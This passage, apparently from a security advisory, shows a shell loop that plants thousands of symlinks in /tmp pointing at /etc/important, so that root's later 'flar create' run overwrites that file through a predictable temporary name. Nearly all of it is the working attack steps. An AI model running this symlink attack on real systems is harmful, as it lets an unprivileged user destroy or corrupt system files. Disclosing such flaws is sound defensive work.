
   $ x=0
   $ while [ "$x" -le 30000 ];do
   > ln -s /etc/important /tmp/.flash_filter_one_.$x
   > x=$(expr "$x" + 1)
   > done

Later, when root creates a flash archive with:

   # flar create -n junk `pwd`/junk.flar
